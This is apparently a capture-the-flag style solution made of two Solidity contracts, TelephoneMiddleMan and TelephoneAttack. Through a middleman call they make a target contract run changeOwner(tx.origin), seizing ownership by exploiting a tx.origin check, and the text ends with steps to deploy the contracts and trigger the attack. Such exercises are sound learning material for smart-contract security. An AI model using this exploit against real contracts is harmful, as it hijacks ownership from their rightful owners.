```javascript
pragma solidity ^0.6.0;

contract TelephoneMiddleMan {
    address public base_address; 
    
    constructor(address addr) {
        base_address = addr;
    }
    
    function attack() public returns (bool) {
        (bool success, ) = base_address.call{ gas : 2000000 }(abi.encodeWithSignature("changeOwner(address)", tx.origin));
        require(success, "Failed to change owner.");
        return success;
    }
}
```

```javascript
pragma solidity ^0.6.0;

contract TelephoneAttack {
    address public middleman;
    
    event AttackStatus(bool is_successful);
    
    constructor(address addr) {
        middleman = addr;
    }
  
    function attack() public {
        (bool success , bytes memory data) = middleman.call{ gas : 2000000 }(abi.encodeWithSignature("attack()"));
        require(success, "Failed to attack.");
        bool result = abi.decode(data, (bool));
        emit AttackStatus(result);
    }
}
```

First deploy `TelephoneMiddleMan` contract, then use its address to initialize the `TelephoneAttack` contract. Finally, call `attack()`.
